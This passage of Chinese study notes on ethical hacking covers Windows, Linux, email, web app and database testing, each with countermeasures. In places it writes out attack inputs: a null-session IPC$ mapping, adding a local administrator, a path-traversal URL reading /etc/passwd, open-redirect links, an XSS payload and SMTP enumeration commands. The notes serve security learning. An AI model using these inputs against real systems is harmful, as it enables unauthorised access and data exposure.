link set wlan0 address 01:23:45:67:89:ab        c)使用以下命令重新启用该网络接口：        # ifconfig wlan0 up    MAC Changer(www.alobbs.com/macchanger)        SMAC    (4)确保无线网卡为适当的SSID进行过配置    (5)在网络中获取IP地址    (6)通过ping其他主机或浏览互联网，确认自己已经连到网络中防御MAC欺骗的对策    WPA，WPA2昆士兰拒绝服务攻击    （百度脑补吧，太底层了。。。）防御拒绝服务攻击的对策：    在802.11b/g网络中安装病使用无线入侵防御系统。    使用具有跳频扩频(frequency hopping spread spectrum)或正交频分复用(OFDM)功能的无线技术。物理安全问题    设置在建筑物以外以及能被公众接触到的接入点    未经妥善安装的天线，导致广播太强的信号或是可悲公众接触。防御物理安全问题    将接入点的发射功率调小    使用较小的或不同类型的天线以减弱信号。脆弱的无线工作站防御脆弱无线工作站的对策    除了其他网络主机外，要定期对无线工作站执行漏洞评估    应用最新的厂商安全补丁，并强制使用强用户密码    在所有可以使用个人防火墙和终端安全软件的无线系统上使用这些软件    安装反恶意软件软件默认的配置设置    默认的SSID和管理员密码。防止默认配置设置被利用的对策    确保自己更改了默认的管理员密码和SSID    最少要启用WPA    如果不需要SSID广播功能的话，将其禁用    为接入点和无线网卡应用最新的固件补丁Windows攻击    鉴于Windows的易用性、为企业准备的活动目录(Active Directory)服务，以及功能丰富的.NET开发平台，很多组织出于联网和计算的需求已经使用了微软平台。很多企业，特别是那些中小型企业，在网络使用中是完全依赖Windows的。很多大型组织的关键服务器(比如Web服务器和数据库服务器)也是运行在Windows平台上的。        敏感信息的泄露        密码被破解，并被用于执行其他攻击        系统由于遭受拒绝服务攻击而彻底离线        被黑客取得安全的远程控制权        整个数据库被窜改或删除选择工具    免费的微软工具        Windows内置的程序，用于NetBIOS和TCP/UDP服务枚举            用于收集NetBIOS名称表信息的nbstat            用于显示本地Windows系统的开放端口netstat            用于运行多项基于网络命令的net        Microsoft Baseline Security Analyzer，可用来测试缺失的补丁和基本的Windows安全设置        Sysinternals，可用来在本地或通过网络探查，刺探和监控Windows服务、进程和资源。    多功能评估工具        端口扫描        操作系统指纹测试        简单的密码破解        对工具在Windows系统中找到的各类安全缺陷进行详细地漏洞映射        GFI LANguard        QualysGuard    专用工具        Metasploit        ShareEnum,可用于对共享的枚举        SuperScan，可用于TCP端口扫描、ping扫描和对共享的枚举        TCPView，可用于查看TCP和UDP会话的信息        Winfo，可用于空会话枚举，从而收集诸如安全政策、本地用户账户和共享之类的配置信息。收集信息    扫描系统        1.测试        (1)运行基本扫描，找到各Windows系统中都有哪些端口是开放的        SuperScan        (2)使用LANguard进行操作系统枚举，比如扫描共享和具体的操作系统版本        LANguard,Nmap        (3)确定潜在的安全漏洞        2.防御系统扫描的对策            使用网络防火墙    在各系统上都使用Windows防火墙或其他个人防火墙软件。关闭用于RPC服务(135)和NetBIOS服务(137-139,445)的网络端口            禁用非必需的服务    NetBIOS(网络基本输入输出系统)        用于网络浏览的UDP端口：        137：NetBIOS名称服务        138：NetBIOS数据报服务        用于服务器消息块(SMB)的TCP端口        139：NetBIOS会话服务        445：在没有NetBIOS的情况下通过TCP/IP运行SMB        3.攻击            未认证枚举            共享空会话    将匿名连接(或空会话)映射道名为IPC$(表示进程间通信)的隐藏共享        可收集Windows主机的配置信息        编辑远程计算机注册表的部分内容    映射        1.net use \\host_name_or_IP_address\ipc$ &quot; &quot;&quot;/user&quot;    收集信息        1.net view:显示共享信息        2.配置和用户信息            Winfo和DumpSec可以收集与用户和配置有关的实用信息            reg：系统所属的Windows域；安全政策设定；本地用户名；驱动器共享            Winfo：http://www.ntsecurity.nu/toolbox/winfo/        3.NetUsers工具            www.systemtools.com/free.htm            可以显示谁登录到了远程的Windows计算机                reg：被滥用的账户权限；当前登录到系统的用户防御空对话攻击的对策    阻止以下TCP端口穿越网络防火墙或个人防火墙        139；445    可以禁用网络连接属性里的“Microsoft网络的文件和打印机共享”    限制接入到系统的匿名连接    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\RestrictAnonymous键的DWORD值设置成以下状态        空：默认设置        不允许对SAM账户和共享进行枚举（值1）（中等安全）        没有显式匿名权限就不允许访问（值2）（高安全）共享权限    介绍的Windows版本太低了，不写利用缺少的补丁进行攻击    Win7具备以下一些安全功能：        默认启用的Windows Defender间谍软件防护        Windows防火墙的增强版对入站和出站流量都进行了保护        通过用户账户控制(UAC)，取消常规用户的本地管理员权限        将运行服务的特权限至最小        网络访问保护(NAP)        通过BitLocker实现驱动器加密        对Internet Explorer 8机械能大量隐私强化和安全更新    使用Metasploit        www.metasploit.com/framework        步骤：        Exploits        Forward        Apply        net localgroup administrators username /add防御缺失补丁漏洞攻击的对策    Windows Update    Windows Server Update Services(WSUS)    BigFix Patch Management    Lumension Patch and RemediationLinux    丰富的资源可供选择，包括书籍、网站以及开发人员和顾问的专业知识    Linux不像Windows及其应用程序那样易受攻击。    易用性的提升Linux的漏洞    敏感信息被泄露    密码被破解    数据库被损坏或删除    系统彻底离线选择工具    SuperScan 3:可以用于ping扫描和TCP端口扫描    Nmap:可用于操作系统指纹测试和端口    LANguard：可用于端口扫描、枚举和漏洞测试    THC-Amap：可用于应用程序版本映射    Tiger：可用于自动评估本地系统安全设置    Linux Security Auditing Tool(LSAT):可用于自动评估本地系统安全设置    QualysGuard：可用于操作系统指纹测试、端口扫描和漏洞测试    Nessus：可用于操作系统指纹测试、端口扫描和漏洞测试    BackTrack工具集    工具下载地址：SourceForge.net     freshmeat.net收集信息    扫描系统        守护进程(daemon)        Internet服务，比如Apache Web服务器(httpd)、telnet(telnetd)和FTP(ftpd),包括软件版本、内部IP和用户名        TCP和UDP小服务，reg:echo、daytime和chargen        有漏洞的OpenSSH版本        finger服务信息        BSD的r系列服务rlogin和rexec防御系统扫描对策    防火墙 netfilter/iptables（www.netfilter.org）    基于主机的入侵防御应用,reg:PortSentry  SNARE    禁用不需要的服务，RPC、HTTP、FTP和telnet搜索    1.漏洞    FTP    telnetd    r系列服务    旧版本的sendmail    2.工具    Nmap    Amap    netstat -anp可显示在本地机器上运行的服务    lsof（List Open Files）会显示系统中监听的进程和打开的文件防御措施    1.禁用不需要的服务    inetd.conf    # ps -aux    # vi /etc/inetd.conf    按I    进程开头输入#，注释掉    Esc      :wq    kill -HUP PID    chkconfig    Chkconfig--del snmpd    2.访问控制    TCP Wrappers可以控制对运行关键服务（如FTP或HTTP）的访问    rhosts和hosts.equiv文件    1.hosts.equiv        /etc/hosts.equiv文件不会泄露root访问信息，不过它指明了系统中的哪些账户可以访问本地主机上的服务        如果配上.rhosts文件，外部黑客就可以读取hosts.equiv文件，然后伪造IP和主机名，获取访问权    2.rhosts        $home/.rhosts文件指明了哪些远程用户不需要密码就可以在本地系统中访问BSD的r系命令。.rhosts文件可能是以下这样的：            tribe scott            tribe eddie        该文件可以让远程系统tribe上的用户Scott和Eddie可以登录到本地主机，授予权限。如果远程主机和用户字段出现的是加号(+)，就表示任何主机上的任何用户都可以登录到本地系统。黑客可以通过以下手段向其添加数据项：            手工处理该文件            利用系统运行的Web服务器应用中不安全的CGI(Common Gateway Interface,通用网关接口)脚本存在的漏洞，运行脚本进行漏洞攻击。        这些文件默认是未启用的。    防御.rhosts和hosts.equiv文件攻击的对策：        1.禁用命令            注释掉inetd.conf文件中以shell、login和exec开头的行            编辑位于/etc/xinetd.d目录中的rexec、rlogin和rsh文件。将&quot;disable=no&quot;改为&quot;disable=yes&quot;            在Red Hat企业版Linux中可以setup-&gt;&quot;System Services&quot;-&gt;删除每个r服务旁边的星号        2.阻止访问            在防火墙阻止伪造的地址            只为每个文件的所有者设定读权限            .rhosts:在每个用户的home目录下输入：            chmod 600 .rhosts            hosts.equiv:在/etc目录下输入：            chmod 600 hosts.equiv            使用Tripwire监控这些文件    网络文件系统(Network File System,NFS)            用途是从本地机器上挂接(mount)远程文件系统(类似于Windows中的共享)    网络文件系统攻击        如果/etc/exports文件的设置允许所有人读取整个文件系统，远程hacker就可以获取信息。        /etc/exports文件中加入一行            /    rw        表示任何人都能远程挂接root分区，并具有读写权限。还要满足下列条件：            必须加载nfsd，必须加载将NFS映射到RPC的portmap守护线程            防火墙必须允许网络文件系统流量通过            被允许进入运行着nfsd的服务器的远程系统必须载入/etc/hosts.allow文件    防御网络文件系统攻击的对策        如果不需要网络文件系统，那么将其禁用        如果需要，请：            在防火墙过滤网络文件系统流量，过滤111端口上的流量。            确保/etc/exports文件和/etc/hosts.allow文件得到妥善配置    文件权限        SetUID(用于用户ID)        SetGID(用于组ID)    文件权限攻击        默认情况下，以root权限运行的流浪程序是很容易被隐藏起来的。外部攻击者或恶意内部人员可能会这样做，从而在系统中隐藏黑客文件(如rootkit)。完成这一切只需要在他们的黑客程序中编入SetUID和SetGID代码即可。    防御文件权限攻击的对策        1.手工测试            为SetUID配置过的程序：            find / -perm -4000 -print            为SetGID配置过的程序：            find / -perm -2000 -print            可被任何人读取的文件：            find / -perm -2 -type f -print            隐藏文件：            find / -name &quot;.*&quot;        2.自动测试            变更检测应用，如Tripwire，有助于记录什么内容在何时发生了改变            文件监控程序，如COPS，可以找出哪些状态已经改变的文件    缓冲区溢出        RPC和其他脆弱的守护进程都是缓冲区溢出攻击的常见目标。可以进行修改系统文件和读取数据库文件等活动。    攻击        攻击者既可以手动向Linux机器发送信息字符串，也可以编写脚本来完成。字符串内容：            告诉处理器基本上什么都别做的指令。            取代受攻击进程的恶意代码，比如用exec (&apos;&apos; /bin/sh&apos;&apos;)创建shell命令提示符            指向内存缓冲区中恶意代码起始位置的指针。            运行在Linux中易受攻击的软件具体包括Samba、MYSQL和Firefox。    防御缓冲区溢出攻击的对策        禁用不需要的服务；        用防火墙或基于主机的入侵防御保护自己的Linux系统；        启用另一种用密码验证用户身份的访问控制机制，比如TCP Wrappers。    物理安全        物理安全攻击                        当黑客就在系统控制台时，任何事都可能发生，包括按下Ctrl+Alt+Delete组合键重启系统。在系统重启之后，黑客就可以启动系统的单用户模式，root密码置零        物理安全防御对策            对/etc/inittab文件进行编辑，将# ca:ctrlaltdel:/sbin/shudown -t3 -r now这一行注释，这将防止他人通过按下组合键重启系统。    一般性安全测试        shadow password文件中配置错误或未经授权的项        密码复杂度的要求        相当于root的用户        配置在脚本调度程序cron中的可疑自动化任务        系统二进制文件的签名检查        rootkit检查        网络配置，包括防止数据包欺骗和其他拒绝服务(DoS)攻击的对策        系统日志文件的权限        工具：Tiger安全审计工具(www.nongnu.org/tiger)        LSAT和Bastille Hardening程序Novell Netware    (跳过，，目前应该接触不到)攻击应用程序    通信和消息系统        Email    即时消息(IM)和IP电话(VoIP)        针对消息系统的恶意攻击包括：            传输恶意软件；            使服务器崩溃；            获得对工作站的远程控制；            捕获在网络中传送的敏感信息；            审读存储在服务器和工作站上的Email；            审读工作站硬盘驱动器中的即时消息日志文件；            通过日志文件或网络分析器，收集传送趋势信息，这些信息可以将人和组织之间的对话透露给黑客；            捕获并回放电话交谈；            收集内部网络配置信息，如主机名和IP地址。        Thomas Akin             电子邮件攻击        攻击方法：收集公开信息，扫描并枚举系统，发现和利用漏洞        电子邮件炸弹            电子邮件炸弹可以让服务器崩溃，并为攻击者提供未经授权的管理员访问权。它通过对Email系统，甚至是网络和互联网连接造成拒绝服务来进行攻击，因为它占据大量带宽，有时还会需要大量存储空间。            1.附件                附件超载攻击                为使服务完全中断，整个电子邮件服务器可能成为目标。                    存储器超载                    带宽阻塞                防御措施：                    限制Email的大小                    限制每个用户在服务器上的存储空间。            2.连接                发送海量Email，可能导致服务器无法处理任何入站或出站的TCP请求，可能会造成服务器完全被锁定或服务器崩溃，从而使攻击者能够获得对系统的管理员访问权或root访问权。                海量Email攻击            3.自动化的Email安全控制                tarpitting.会检测目的地为未知用户的入站消息。                电子邮件防火墙。reg：CipherTrust IronMail和Messaging Architect的M+Guardian。                周边保护。                CAPTCHA。        banner                获取banner，看看能否发现在运行的是哪种Email服务器软件。是搞清SMTP、POP3和IMAP服务器有哪些了解的一项特别关键的测试。            1.收集信息                25端口        telnet(ip or-hostname-of-your-server)25    --收集SMIP信息                110端口        --收集POP3                143            --收集IMAP                smtpscan(www.freshports.org/security/smtpscan)                可被利用的堆溢出漏洞：                    Microsoft Exchange(http://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-0027)                    Novell NetMail(http://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-6424)            2.防御banner攻击的对策                修改默认的banner，将信息隐藏起来                软件补丁                尽可能巩固自己的服务器        SMTP(简单邮件传输协议)攻击            1.账户枚举                25     VRFY    是“verify”(验证)的缩写    --可以让服务器检查某个特定的用户ID是否存在。垃圾邮件制造者们通常会自动化该方法，以执行目录收集攻击(DHA)。这种方法可以从服务器或域中收集有效的电子邮件地址。                使用账户枚举进行的攻击                    vrfy info@principlelogic.com                EXPN        是“expend”(扩展)的缩写                --可使攻击者能验证服务器上存在哪些邮件列表。                expn coolusers                结果：&lt;CoolUsers@principlelogic.com&gt;                另一种方法，使用Tamosoft Essential NetTools中的EmailVerify程序。                还有一种捕获方法：使用BT工具集的TheHarvester通过Google和其他搜索引擎收集地址。                BT-&gt;Information Gathering-&gt;SMTP-&gt;Goog Mail Enum，然后输入./goog-mail.py -d&lt;域名&gt; -l 500 -b google             2.中继                SMTP中继让用户可以通过外部服务器发送电子邮件。                自动测试                    www.abuse.net/relay.html                    基于Windows的工具：NetScanTools Pro-&gt;SMTP Relay                手工测试                    (1)telnet连接服务器的25端口                    使用自己最喜欢的图形telnet应用，reg:HyperTerminal或SecureCRT                    telnet mailserver-address 25                    (2)输入命令告诉服务器，“嗨，我正从这个域进行连接呢”                    (3)输入命令告诉服务器自己的Email地址：reg：                    mail from:yourname@yourdomain.com                    (4)输入命令告诉服务器要将Email发送给谁，reg:                    rept to:yourname@yourdomain.com                    (5)输入命令告诉服务器接下来是消息正文,reg:                    data                    (6)输入以下文本作为消息正文                    A relay test !                    (7)在一行的最后使用句点结束该命令                    (8)检查服务器上的中继功能                        查找从服务器返回的Relay not allowed(不允许使用中继)这样的消息。如果有，说明要么不允许，要么过滤了SMTP中继转发。                        rcpt to:    --获得该信息                        如果收到自己发送的Email，那么说明SMTP中继转发功能已启用。                防御SMTP中继攻击的对策                    在Email服务器上禁用SMTP中继            3.电子邮件头信息泄露                攻击者可以找到：                电子邮件客户端机器的内部IP地址                客户单和电子邮件服务器的软件版本以及这些软件的漏洞                主机名            4.捕获流量                dsniff工具包中的Mailsnarf                NetResident            5.恶意软件                EICAR测试字符串，通过Email消息正文或文件附件的形式传输，从而让自己能看到服务器和工作站的反应。在计算机中访问含有以下字符串的文本文件，看看自己的杀毒软件或其他恶意软件防御软件能否检测出该“病毒”                X50!P%@AP[4\PZX54(P^)7CC}$EICAR STANDARD-ANTIVIRUS-TEST-FILE!$H+H*                GFI的电子邮件安全测试区                    即时消息                        漏洞：            姓名劫持            利用即时消息客户端的漏洞，让攻击者获取对计算机的远程控制权            传输恶意软件        一般在文件共享和日志文件方面有漏洞。会影响（AIM）和ICQ            1.文件共享                确认网络中即时消息使用情况最佳方式就是使用网络分析器并监控即时消息流量。            2.日志文件                c:\Program Files\ICQ找到ICQ对话日志文件        防御即时消息的对策            1.检测即时消息流量                工具：                网络分析器                Quest Policy Authority for UC                FaceTime的IMAuditor                桌面审计：Ecora的Auditor Professional和Microsoft System Center ConfigurationManager            2.维护和配置                用户行为                    禁止或限制所有P2P软件                    指导用户                系统配置                    更改默认按照目录                    补丁                    杀毒软件和防火墙                    如果出于业务目的而允许在网络中使用即时消息，请考虑标配一种基于企业的即时消息应用。如：Jabber或Lotus Sametime    IP电话        默认设置        补丁缺失                    弱密码        IP电话具有两个特有的安全命门：第一个是电话服务中断；语音通话没有经过加密        SIP        RTP        1.扫描漏洞        SiVuS(http://vopsec.net/html/tools.html)        2.捕获并记录语音流量        Cain        防御IP电话漏洞的对策        (书上没有怎么介绍)网站和Web应用    工具:    Acunetix Web Vuinerability Scanner(www.acunetix.com)，包含了端口扫描器、HTTP嗅探器和自动SQL注入工具    Firefox Web Developer(http://chrispederick.com/work/web-develeper),用于对网页进行手工分析和操作    HTTrack Website Copier(www.httrack.com),可为网站制作镜像用于离线检查    N-Stalker Web Application Security Scanner(www.nstalker.com/eng/products/nstealth)可进行一体化安全测试，含有密码破解和Web服务器负载测试工具。    WebInspect(www.spidynamics.com/products/webinspect/index.html)用于一体化安全测试，包含了HTTP代理和HTTP编辑器，以及自动SQL注入工具。    漏洞扫描器(QualysGuard和LANguard)    漏洞攻击工具(Metasploit)    hacker:Caleb Sima            Web漏洞        目录遍历        1.爬虫程序        2.Google            高级查询：            site:主机名 关键词。这将搜索列出的任意关键词。reg：SSN，confidential和credit card            filetype:文件扩展名主机名。reg:.doc、.pdf、.db等            allintitle会搜索网页标题中的关键词；            inurl会搜索网页URL中的关键词；            related会找出与该网页相似的网页；            link会显示链接到该网页的其他网站。            在www.google.com/intl/en/help/operators.html找到具体的定义和更多操作符            Google Hacking Database(GHDB)(http://johnny.ihackstuff.com/ghdb)            http://artkast.yak.net/81找到其他查询            Google Groups(http://groups.google.com)            hacker:Johnny Long        防御目录遍历的对策            不要在Web服务器上存储旧的、敏感或非公开的文件。/htdocs或DocumentRoot            配置robots.txt文件，防爬虫            确保Web服务器配置得当，从而使公众只能访问那些网站正常运转所需的文件。最小特权是关键。                访问控制措施有：                Apache的httpd.conf文件和.htaccess文件                Internet信息服务管理器的主目录和目录设置（IIS 5.1）                Internet信息系服务管理器的主目录和虚拟目录设置(IIS 6.0)            最后考虑使用搜索引擎蜜罐系统，reg:Google Hack Honeypot(http://ghh.sourceforge.net)    输入过滤攻击        一些插入恶意构造数据(通常是一次性插入过多数据)的攻击可能针对网络和Web应用展开，这可能会导致系统混乱或崩溃，或是使系统向攻击者泄露过多的信息。        1.缓冲区溢出        reg:            &lt;form name=&quot;Webauthenticate&quot; action=&quot;www.your_Web_app.com/login.cgi&quot; method=&quot;POST&quot;&gt;                ...                &lt;input type=&quot;text&quot; name=&quot;inputname&quot; maxsize=&quot;12&quot;&gt;                ...            &lt;/form&gt;        操纵它 需要使用Web代理逐步跟踪网页提交过程,Web代理有：Web漏洞扫描器和Paros Proxy软件        Web代理处于Web浏览器与待测试服务器之间，使大家可以操控发送给服务器的数据。        Firefox:工具-&gt;选项-&gt;高级-&gt;网络-&gt;连接-&gt;设置-&gt;手动配置代理        IE:工具-&gt;Internet选项-&gt;连接-&gt;局域网设置-&gt;为LAN使用代理服务器        在浏览器提交页面之前，修改变量的字段长度，用大家提供的任意长度提交。也可以用Firefox中的&quot;Web开发者&quot;选项删除Web表单中定义的最大表单长度。        2.URL的篡改            自动输入攻击会篡改URL，并将其发送回服务器，告诉该Web应用做各种事情。本地文件包含(local file inclusion)就是这样一种漏洞。这是在Web应用接受基于URL的输入(通常是通过CGI)，并将指定文件的内容返回给用户时发生的。reg：WebInspect会发送这样请求：            https://www.your_web_app.com/onlineserv/Checkout.cgi?state=datail&amp;language=english&amp;imageSet=/../..//../..//../..//../..///etc/passwd            other method:            http://www.your_Web_app.com/error.aspx?PURL=http://www.bad-site.com&amp;ERROR=Path+&apos;OPTIONS&apos;+is+forbidden.            http://www.your_Web_app.com/exit.asp?URL=http://www.bad-site.com            可通过电子邮件向不知情的用户发送该链接，或将其发布到网络上。        3.隐藏字段的篡改            (1)查看HTML源代码            (2)篡改存储在这些字段中的信息            (3)重新将页面放回服务器            Web Proxy或Paros Proxy可以篡改隐藏字段。        4.代码注入和SQL注入            代码注入攻击也会篡改特定的系统变量：            http://www.your_Web_app.com/script.php?info_variable=X            如果可以，就修改X的值继续注入            常见的SQL注入有：标准注入(基于错误的注入)和盲注入            一种快速确定Web应用是否易受SQL注入的方法：只要在Web表单字段或是URL的末尾输入一个单引号(&apos;)，如果返回SQL错误，那么十之八九会出现SQL注入。            WebInspect自带的SQL Injector        5.跨站脚本(cross-site scripting,XSS)            在网页通过JS和VBScript显示出未被正确验证的用户输入时就会出现这种情况。黑客可以利用输入过滤机制的缺失，让网页在任何浏览该网页的用户计算机上执行恶意代码。            reg：跨站脚本攻击可以显示另一个流氓网站的用户ID和密码登录页面。如果输入，就会进入到其日志文件中。其他的恶意代码便会发送到受害人的计算机，并能以与系统中查看它的Web浏览器或电子邮件应用程序相同的安全权限运行。恶意代码会为黑客提供对浏览器cookie、浏览器历史文件的完整读写访问权，甚至可能允许下载/安装恶意软件。            &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;            WebInspect和Acunetix Web Vulnerability Scanner就很善于找出跨站脚本。        防御输入攻击的对策            应用应该避免呈现Web浏览器和用户不需要看到的静态值。这些数据应该在服务器端的Web应用中实现，而且只有在需要时才从数据库中检索。            应用应该从输入字段中过滤掉&lt;script&gt;标签            可以的话，应该禁用Web服务器和数据库服务器的错误信息。            十六进制编辑器查看应用是如何在内存中存储敏感信息的。可以使用WinHex(www.x-ways.net/winhex)            reg:(一个脆弱的GET请求)                https://www.your_Web_app.com/access.php?username=kbeaver&amp;password=WhAteVur!&amp;login=SoOn                GET请求通常会存储在用户Web浏览器的历史文件、Web服务器的日志文件和代理的日志文件中。        默认脚本攻击：            比如CGI(通用网关接口)和ASP(动态服务器页面)脚本            测试用Find程序            N-Stalker Web Application Security Scanner        防御默认脚本攻击措施：            在向Web应用中部署脚本之前先了解脚本的作用机制            在使用脚本之前，确定从Web服务器中删除了所有的默认脚本或示例脚本。            为网站/Web应用中的敏感区域设置文件权限以防止公众访问这些区域。        不安全的登录机制：            使用无效的用户ID和有效的密码            使用有效的用户ID和无效的密码            使用无效的用户ID和无效的密码            URL会返回不同值            Brutus            BlackKnightList        防御不安全登录机制的对策            返回给最终用户的登录错误消息要尽可能一般化            避免应用程序在URL中返回对无效用户ID和无效密码区别对待的错误代码。            reg:www.your_Web_app.com/login.cgi?success=false;            使用CAPTCHA或Web登录表单，以阻止/减慢密码破解的尝试            在Web服务器上或Web应用中部署入侵者锁定机制，从而在10至15次登录失败后锁定用户账户。            将厂商提供的默认密码更改为易于记忆而难于破解的新密码。        Web2.0的黑客攻击            新技术：Web Services，Ajax和Flash            测试Web2.0应用中的漏洞：                Firefox Web Developer可用于分析脚本代码和执行其他手工检查                SWFScan可用于分析Shockwave Falsh(.swf)文件                WSDigger可用于分析Web服务                WSFuzzer可用于分析Web服务        降低风险的做法：            可用OWASP WebGoat Project和Foundstone的Hacme Tools测试            为保护Web应用和关联的数据库，请使用不同的机器运行Web服务器、应用服务器和数据库服务器。            使用内置的Web服务器安全功能，reg：IIS中的应用隔离功能            使用工具隐藏Web服务器的身份，reg：Port 80 Software的ServerMask                如果在hacker在运行Microsoft IIS服务器和应用，那么可以重命名所有的ASP脚本，为其增加.cgi扩展名                如果是Linux Web服务器，可用IP Personality改变操作系统的指纹信息                改在非标准端口上运行Web应用。        防火墙            可以检测并阻止Web应用攻击的、基于网络的防火墙.reg:Juniper Networks,SonicWall和Check Point            基于主机的Web应用入侵防御系统。reg:SecureIIS,ServerDefender        源代码分析：            静态源代码分析工具：Ounce Labs和Klockwork。            Checkmarx的CxDeveloper，Security Innovation数据库和存储系统    工具：    Advanced SQL Password Recovery(www.elcomsoft.com/asqlpr.html)可破解Microsoft SQL Server的密码    Cain&amp;Abel(www.oxid.it/cain.html)可用于破解数据库密码散列    QualysGuard可执行深入的漏洞扫描    SQLPing3(www.sqlsecurity.com/Tools/FreeTools/tabid/65/Default.aspx)可用于确定网络中Microsoft SQL Server服务器的位置，检查空SA密码，并执行字典密码破解攻击    hacker:奇普·安德鲁斯    Absinthe    Oracle工具:www.petefin nigan.co/tools.htm，Pete Finnigan    Elcomsoft Distributed Password Recovery也可以破解Oracle密码散列    如果能访问SQL Server的master.mdf文件，就可以使用Elcomsoft的Advanced SQL Password Recovery立即回复数据库的密码。    Access工具：Advanced Access Password Recovery(www.elcomsoft.com/acpr.html)    利用Microsoft SQL Server Management Studio Express(www.microsoft.com/express/sql/default.aspx)    扫描数据库漏洞        缓冲区溢出；        特权提升；        可通过默认/未受保护账户访问的密码散列；        启用脆弱的身份验证方法；        在不验证身份情况下就可重命名的数据库监听器日志文件。        对SQL Server和Oracle深入检查的工具：        NGSSQuirreL(www.ngssoftware.com/products/database-security)        AppDetectivePro(www.appsecinc.com/products/appdetective)    减少数据库安全风险的做法；        在不同的机器上运行各数据库。        检查底层操作系统的安全漏洞。        确保数据库也处在打补丁和系统巩固工作的范围之内。        每个数据库系统都要求使用强密码。        使用恰当的文件和共享权限以防止他人窥探。        在敏感的生产数据用于开发或质量保证过程之前，要对这些数据采取反识别措施        检查Web应用是否具有SQL注入及相关的数据验证漏洞。        使用网络防火墙        运行最新版的数据库服务器软件。    存储系统        测试SAN和NAS系统安全性        工具：        FileLocator Pro(www.mythicsoft.com/filelocatorpro)可用于查找非结构化文件中的敏感信息。        Identity Finder(www.Identity Finder)可用于查找非结构化文件中的敏感信息。        LANguard可用于查找开放且未受保护的共享        QualysGuard        SuperScan        利基安全测试工具：        CHAP Password Tester(www.isecpartners.com/cpt_chap_password_tester.html)        CIFShareBF(www.isecpartners.com/SecuringStorage/CIFShareBF.zip)        GrabiQNs(www.isecpartners.com/SecuringStorage/GrabiQNs.zip)        NASanon(www.isecpartners.com/SecuringStorage/NASanon.zip)        StorScan(www.isecpartners.com/storscan.html)    挖出网络文件中的敏感洗文本        文本搜索实用程序：FileLocator Pro或Effective File Search(www.sowsoft.com/search.htm)        员工的健康记录；        客户的信用卡号码；        公司的财务报表        使用FileLocator Pro时，查找：            DOB：表示出生日期            SSN：表示社会保障号码            License：表示驱动程序的许可证信息            Credit：表示信用卡号码        搜索范围：            .txt            .doc和.docx            .dbf            .db            .rtf            .xls和.xlsx            使用Indentity Finder扫描存储设备    降低存储系统安全风险的最佳做法：        检查底层操作系统的安全漏洞        确保网络存储也处在打补丁和系统巩固工作的范围之内        要求为每个存储管理界面都使用强密码        使用恰当的文件和共享权限以防止他人窥探。        教育用户        在敏感的生产数据用于开发或质量保证过程之前，要对这些数据采取反识别措施        为合适的内网段使用网络防火墙道德攻击的结果    汇报结果        整理结果：            评估工具上的漏洞分级            自己的安全专业知识            漏洞的具体背景        最终报告文档：            非技术问题                社会工程学漏洞                物理安全漏洞                IT运营弱点                其他            工作站和服务器                操作系统                其他            应用程序            公共访问性            内部情况            数据库系统            网络基础设施系统                集线器和交换机                路由器                防火墙                入侵检测系统                无线接入点                其他            内部漏洞，reg:内部主机和运营问题            外部漏洞：reg:公共主机、业务伙伴网络连接和远程工作者    漏洞优先级：        被利用的可能性        被利用的影响        x轴：可能性        y轴：影响度        OCTAVE    汇报方法：        执行测试的日期和时间        执行的测试        所发现漏洞的摘要        需要解决的漏洞的优先级列表        如何堵上所发现漏洞的建议和具体操作步骤        改善整体安全性一般性建议清单        行动项：            在所有的服务器上启用Windows审计            为服务器机房的门上一把安全的锁            根据全国漏洞数据库和互联网安全中心的基准测试/评分工具            巩固自己的无线接入点            使用交叉碎切碎纸机来销毁含有机密信息的纸质文件            在所有的笔记本电脑上安装防火墙            在所有的Web应用中都要验证输入            为数据库服务器应用最新的厂商补丁。    修补安全漏洞        将报告变为行动        打好补丁        补丁管理        补丁自动化            1.商业工具：                BigFix                Shavlik Technologies NetChk                Ecora Patch Manager                ScriptLogic Patch Authority Ultimate                微软的Windows服务器更新服务                GFI LANguard            2.免费工具                Microsoft Update                Microsoft Baseline Security Analyzer(MBSA)    巩固系统    评估安全体系结构管理安全变化    自动化道德黑客攻击流程    监控恶意使用    外包道德黑客测试    灌输注意安全的意识三个十项    培养盟友和担保人    不要大惊小怪    证明组织承担不了被黑客攻破的后果    概述道德黑客测试的一般益处    展示道德黑尔康测试具体对组织有何帮助    融入企业之中    构建自己的信誉    从管理人员的角度讲话    展示所作努力的价值    灵活行事，多加适应黑客攻击是唯一有效的测试方法的十项原因    坏人们有着坏想法，使用着好工具，并在发明新的攻击方法    IT治理和遵守规定不只是高层级的清单式审计    道德黑客测试是对审计及安全评估的补充    有人会问系统有多安全    平均定律是与企业相悖的    道德黑客测试让企业更好地理解风险    如果破坏发生，要有退路    道德黑客测试揭露了系统中最糟的问题    道德黑客测试结合了最好的渗透测试和漏洞测试    道德黑客测试能发现被忽视多年的运营弱点工具和资源    蓝牙        BlueScanner--https://labs.arubanetworks.com        Bluesnarfer--www.alighieri.org/tools/bluesnarfer.tar.gz        蓝牙阻击枪--www.tomsguide.com/us/how-to-bluesniper-pt1,review-408.html        Blooover--http://trifinite.org/trifinite_stuff_blooover.html        Bluejacking社区网站--www.bluejackq.com        WindowsXP版BTScanner--www.pentest.co.uk/src/btscanner_1_0_0.zip        Car Whisperer--http://trifinite.org/trifinite_stuff_carwhisperer.html        各种蓝牙攻击的详细展示--http://trifinite.org/Downloads/21c3_Bluetooth_Hacking.pdf        NIST第800-48号特别出版物--http://csrc.nist.gov/publications/nistpubs/800-48-rev1/SP800-48r1.pdf        Smurf--www.gatefold.co.uk/smurf    认证        认证道德黑客(Certified Ethical Hacker)--www.eccouncil.org/CEH.htm        注册信息安全管理师(Certified Information Security Manager)--www.isaca.org        注册信息系统安全专家(Certified Information Systems Security Professional)--www.isc2.org/cissp/default.aspx        注册无线安全专家(Certified Wireless Security Professional)--www.cwnp.com/cwsp/index.html        CompTIA Security+ --www.comptia.org/certifications/listed/security.aspx        SANS GIAC--www.giac.org    数据库        Advanced Access Password Recovery--www.elcomsoft.com/acpr.html        Advanced SQL Password Recovery--www.elcomsoft.com/asqlpr.html        AppDetectivePro--www.appsecinc.com/products/appdetective        Elcomsoft Distributed Password Recovery--www.elcomsoft.com/edpr.html        Microsoft SQL Server Management Studio Express--www.microsoft.com/express/sql/default.aspx        NGSSQuirreL--www.ngssoftware.com/products/database-security        Pete 